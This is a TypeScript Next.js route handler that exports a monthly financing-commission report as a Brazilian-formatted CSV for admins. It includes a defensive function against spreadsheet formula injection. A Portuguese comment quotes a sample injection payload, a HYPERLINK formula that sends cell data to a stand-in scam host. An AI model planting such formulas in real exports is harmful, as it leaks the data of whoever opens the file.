import { auth } from "@/auth";

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";

type ReportRow = {
  date: string;
  client: string;
  clientPhone: string;
  clientEmail: string;
  listingTitle: string;
  assetType: string;
  bank: string;
  financedAmount: number;
  commissionRate: number;
  commissionAmount: number;
  commissionReceivedAt: string;
  stage: "awaiting_commission" | "received";
};

// Planilha pro Excel em português: separador ";" (o Excel do Brasil usa a
// vírgula como decimal), número com vírgula decimal e BOM UTF-8 pra os
// acentos abrirem certo ao dar dois cliques no arquivo.
//
// "Formula injection": sem neutralizeFormula, alguém cria um anúncio com
// título tipo `=HYPERLINK("http://golpe"&A1)` e, quando o admin abre este
// CSV no Excel/Sheets, a fórmula roda. Prefixar com "'" neutraliza sem
// mudar o que aparece na célula (Excel esconde o apóstrofo inicial).
function neutralizeFormula(text: string): string {
  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
}

function cell(value: string | number): string {
  const text = typeof value === "number" ? value.toFixed(2).replace(".", ",") : neutralizeFormula(value);
  return /[";\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

function toCsv(header: string[], rows: (string | number)[][]): string {
  return "﻿" + [header, ...rows].map((row) => row.map(cell).join(";")).join("\r\n") + "\r\n";
}

function dateBr(iso: string): string {
  return iso ? new Date(iso).toLocaleDateString("pt-BR", { timeZone: "America/Sao_Paulo" }) : "";
}

const STAGE = { awaiting_commission: "Aguardando comissão do banco", received: "Comissão recebida" } as const;

// Fechamento mensal (ver FinancingDealsService.monthlyReport): um
// financiamento por linha, com a comissão do NovoSeminovo. ?mes=AAAA-MM
export async function GET(request: Request) {
  const session = await auth();
  if (!session?.user || session.user.role !== "admin") return new Response("Acesso restrito.", { status: 403 });

  const url = new URL(request.url);
  const month = url.searchParams.get("mes") ?? "";
  if (!/^\d{4}-\d{2}$/.test(month)) return new Response("Informe o mês no formato AAAA-MM.", { status: 400 });

  const upstream = await fetch(`${API_URL}/admin/financing-report?month=${month}`, {
    headers: { Authorization: `Bearer ${session.accessToken}` },
    cache: "no-store",
  });
  if (!upstream.ok) return new Response("Não foi possível gerar o relatório agora.", { status: upstream.status });
  const rows = (await upstream.json()) as ReportRow[];

  const csv = toCsv(
    [
      "Data", "Cliente", "Telefone", "E-mail", "Tipo", "Anúncio", "Banco", "Valor financiado",
      "Comissão %", "Comissão (R$)", "Situação", "Comissão recebida em",
    ],
    [
      ...rows.map((row) => [
        dateBr(row.date), row.client, row.clientPhone, row.clientEmail,
        row.assetType === "vehicle" ? "Veicular" : row.assetType === "property" ? "Imobiliário" : "",
        row.listingTitle, row.bank, row.financedAmount, row.commissionRate, row.commissionAmount,
        STAGE[row.stage] ?? "", dateBr(row.commissionReceivedAt),
      ]),
      ["TOTAL", "", "", "", "", "", "", rows.reduce((t, r) => t + r.financedAmount, 0), "", rows.reduce((t, r) => t + r.commissionAmount, 0), "", ""],
    ],
  );

  return new Response(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="comissoes-${month}.csv"`,
      "Cache-Control": "no-store",
    },
  });
}
